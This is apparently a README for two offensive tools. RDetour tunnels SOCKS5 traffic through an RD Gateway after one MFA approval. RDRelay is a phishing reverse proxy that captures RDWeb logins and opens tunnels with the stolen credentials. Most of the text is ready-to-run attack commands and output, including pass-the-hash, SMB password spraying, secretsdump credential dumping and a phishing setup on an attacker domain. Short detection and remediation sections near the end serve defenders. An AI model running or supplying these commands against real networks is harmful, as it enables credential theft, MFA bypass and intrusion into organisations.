# RDetour

Turn an RD Gateway into a SOCKS5 proxy into its internal network.
One MFA push → unlimited tunneled connections. No RDP client, no RDP session.

## RDetour — SOCKS5 over RD Gateway

Authenticates once through the gateway (MS-TSGU HTTP transport), eats the single MFA push, then cycles channels to arbitrary internal host:port targets as SOCKS5 connections. Everything goes through `proxychains`.

### Install

```
pip install pyspnego
```

Python 3.8+. `cryptography` recommended but not required.

### Usage

```
./rdetour.py -g rdg.corp.com -u user -d CORP -p 'password'
```

```
[*] SOCKS5 127.0.0.1:1080 via rdg.corp.com:443 as CORP\user
[warm] establishing tunnel — approve the ONE push (window 60s)
[warm] tunnel live — channels from here on are free
```

Then anything through proxychains:

```
proxychains -q nxc smb 192.168.15.0/24
```

```
SMB   192.168.15.40   445   ECORP-DC      [*] Windows 10 / Server 2019 Build 17763 (name:ECORP-DC) (domain:ecorp.local) (signing:True) (SMBv1:False)
SMB   192.168.15.41   445   ECORP-MECM    [*] Windows 10 / Server 2019 Build 17763 (name:ECORP-MECM) (domain:ecorp.local) (signing:True) (SMBv1:False)
SMB   192.168.15.42   445   ECORP-SQL     [*] Windows 10 / Server 2019 Build 17763 (name:ECORP-SQL) (domain:ecorp.local) (signing:True) (SMBv1:False)
SMB   192.168.15.43   445   ECORP-WS01    [*] Windows 11 / Server 2025 Build 26100 (name:ECORP-WS01) (domain:ecorp.local) (signing:True) (SMBv1:False)
SMB   192.168.15.46   445   ECORP-CA      [*] Windows 10 / Server 2019 Build 17763 (name:ECORP-CA) (domain:ecorp.local) (signing:True) (SMBv1:False)
SMB   192.168.15.47   445   ECORP-RDS     [*] Windows 10 / Server 2019 Build 17763 (name:ECORP-RDS) (domain:ecorp.local) (signing:True) (SMBv1:False)
SMB   192.168.15.50   445   ECORP-VEEAM   [*] Windows 10 / Server 2019 Build 17763 (name:ECORP-VEEAM) (domain:ecorp.local) (signing:True) (SMBv1:False)
```

```
proxychains -q nxc smb 192.168.15.0/24 -u user -p 'password'
```

```
SMB   192.168.15.50   445   ECORP-VEEAM   [*] Windows 10 / Server 2019 Build 17763 (name:ECORP-VEEAM) (domain:ecorp.local) (signing:True) (SMBv1:False)
SMB   192.168.15.50   445   ECORP-VEEAM   [+] ecorp.local\user:password
```

Same tunnel, different tools — no re-auth:

```
proxychains -q getTGT.py ecorp.local/user:password
proxychains -q secretsdump.py ecorp.local/user:password@192.168.15.42
proxychains -q ssh user@192.168.15.60
```

Password via environment variable to keep it out of shell history:

```
export RDETOUR_PASSWORD='password'
./rdetour.py -g rdg.corp.com -u user -d CORP
```

Pass-the-hash:

```
./rdetour.py -g rdg.corp.com -u user -d CORP --hashes aad3b435b51404eeaad3b435b51404ee:ntlmhash
```

### One-shot probe

Quick check that the tunnel works without starting SOCKS:

```
./rdetour.py -g rdg.corp.com -u user -d CORP -p 'password' --target 192.168.15.40:445 --probe smb
```

### Bridge mode

Single persistent channel bridged to a local port — useful for SSH jump:

```
./rdetour.py -g rdg.corp.com -u user -d CORP -p 'password' --target 192.168.15.60:22 --bridge 2222
ssh -D 1080 -p 2222 user@127.0.0.1
```

---

## RDRelay — RDWeb phish-to-VPN

Reverse-proxies an RDWeb portal. Victim logs in through the phishing domain, RDRelay captures their creds, and auto-spawns an rdetour tunnel into the network using those creds. One phished login = one persistent SOCKS tunnel.

### Install

```
pip install aiohttp pyspnego
```

### Usage

```
./rdrelay.py --target https://rds.corp.com --phish-domain rds-corp.attacker.com
```

Victim visits `https://rds-corp.attacker.com`, sees the real RDWeb login, enters creds. RDRelay:

1. Relays the login to the real portal
2. Captures the credentials
3. Spawns `rdetour.py` with those creds → SOCKS tunnel on `127.0.0.1:1080`

```
[relay] session abc123: captured ecorp\jsmith
[killchain] spawning rdetour for ecorp\jsmith → SOCKS 127.0.0.1:1080
[killchain] tunnel live for ecorp\jsmith
```

Then use the tunnel:

```
proxychains -q secretsdump.py ecorp.local/jsmith:password@192.168.15.40
```

With a real cert (Let's Encrypt, etc.):

```
./rdrelay.py --target https://rds.corp.com --phish-domain rds-corp.attacker.com --cert fullchain.pem
```

Lab testing without TLS:

```
./rdrelay.py --target https://rds.corp.com --phish-domain rds-corp.attacker.com --no-tls --port 80
```

---

## Why this works

RD Gateway uses Resource Authorization Policies (RAPs) to control what internal hosts and ports a tunnel can reach. The default RAP — and most deployments — allows connections to **any host on any port**. The gateway software is working as designed.

After the tunnel authenticates (one NTLM handshake + one MFA push), every subsequent channel is checked only against the RAP. No additional MFA, no per-channel authentication. If the RAP says `*:*`, any TCP port on any internal host is reachable.

This is not a vulnerability. It's the default configuration doing what it was configured to do.

## Limitations

- **Serial tunnel.** One channel at a time. Connections are queued and processed sequentially. Single-host tools (getTGT, secretsdump, ssh) work great. Subnet scans work but take multiple passes to build the kill cache — the first `/24` scan is slow, subsequent scans are fast.
- **nxc /24 spray.** nxc's default SMB timeout is 2 seconds. With 7 live hosts all queuing for the serial tunnel, only 1-2 hosts get through per spray pass. Use `--smb-timeout 30` for a full spray, or spray individual hosts from a list.
- **Kill cache cold start.** On first run against a new subnet, dead hosts haven't been cached yet. Each dead host burns a channel cycle (~1-2s) through the oracle. The cache persists to `~/.rdetour/killcache-*.json` with a 7-day TTL — subsequent runs are fast.
- **Port 139.** SMB over NetBIOS (port 139) can kill the tunnel. Stick to port 445.
- **RAP restrictions.** If the RAP is properly locked down (3389 only, specific hosts), the tunnel can't reach anything useful. That's the fix.

## Detection

- RD Gateway event log: events 200/300/302 per channel — look for non-RDP ports (445, 88, 389, 22)
- Anomalous tunnel lifetime (hours/days with keepalive)
- Rapid channel cycling (open/close/open/close to different targets)
- Channels to non-3389 ports

## Remediation

Lock down the RAP:
- Restrict allowed ports to **3389 only**
- Restrict allowed hosts to specific RDP targets — not `*`, not broad subnets
- Audit RAP regularly — the default "allow all" is the root cause

## Legal

Authorized testing only. You need valid credentials and explicit permission to test against the target gateway.
